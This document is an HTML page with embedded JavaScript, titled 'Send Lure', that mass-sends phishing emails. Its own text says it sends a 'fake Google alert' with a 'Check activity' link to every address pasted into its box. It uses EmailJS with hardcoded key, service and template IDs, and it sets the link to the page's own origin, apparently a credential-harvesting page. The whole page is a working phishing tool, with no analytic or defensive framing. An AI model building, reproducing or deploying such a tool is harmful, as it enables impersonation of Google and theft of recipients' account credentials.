<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Send Lure</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background:#f1f3f4; margin:0; padding:32px; color:#202124; }
  .wrap { max-width: 620px; margin: 0 auto; background:#fff; border:1px solid #dadce0; border-radius:8px; padding:28px; }
  h1 { font-size: 20px; font-weight: 500; margin:0 0 8px; }
  p.hint { font-size: 13px; color:#5f6368; margin:0 0 20px; }
  textarea { width:100%; height:200px; padding:12px; font-size:14px; font-family:inherit; border:1px solid #dadce0; border-radius:6px; outline:none; resize:vertical; }
  textarea:focus { border-color:#1a73e8; }
  button { margin-top:16px; background:#1a73e8; color:#fff; border:none; border-radius:4px; padding:11px 22px; font-size:14px; font-weight:500; cursor:pointer; }
  button:disabled { background:#9aa0a6; cursor:default; }
  #log { margin-top:20px; font-size:13px; line-height:1.6; }
  .ok { color:#137333; }
  .bad { color:#c5221f; }
</style>
</head>
<body>
<div class="wrap">
  <h1>Send security-alert lure</h1>
  <p class="hint">One email per line (or comma-separated). Each gets the fake Google alert with the "Check activity" link.</p>
  <textarea id="emails" placeholder="someone@gmail.com&#10;another@yahoo.com"></textarea>
  <button id="sendBtn">Send</button>
  <div id="log"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  const PUBLIC_KEY    = "Umle-w26jGP29PfnV";
  const SERVICE_ID    = "service_ib3ua9l";
  const LURE_TEMPLATE = "template_alpyguf";   // <-- change if you made a separate lure template

  emailjs.init({ publicKey: PUBLIC_KEY });

  const btn = document.getElementById('sendBtn');
  const log = document.getElementById('log');

  function line(msg, cls) {
    const d = document.createElement('div');
    d.textContent = msg;
    if (cls) d.className = cls;
    log.appendChild(d);
  }

  btn.onclick = async () => {
    const raw = document.getElementById('emails').value;
    const list = raw.split(/[\n,;]+/).map(s => s.trim()).filter(Boolean);
    if (!list.length) return line('No emails entered.', 'bad');

    btn.disabled = true;
    log.innerHTML = '';
    let ok = 0, fail = 0;

    for (const addr of list) {
      try {
        await emailjs.send(SERVICE_ID, LURE_TEMPLATE, {
          to_email:     addr,
          target_email: addr,
          timestamp:    new Date().toLocaleString(),
          user_agent:   navigator.userAgent,
          verify_link:  window.location.origin,
          source:       'lure'
        });
        line('✓ sent → ' + addr, 'ok');
        ok++;
      } catch (e) {
        line('✗ failed → ' + addr, 'bad');
        fail++;
      }
      await new Promise(r => setTimeout(r, 350));
    }

    line(`Done. ${ok} sent, ${fail} failed.`);
    btn.disabled = false;
  };
</script>
</body>
</html>
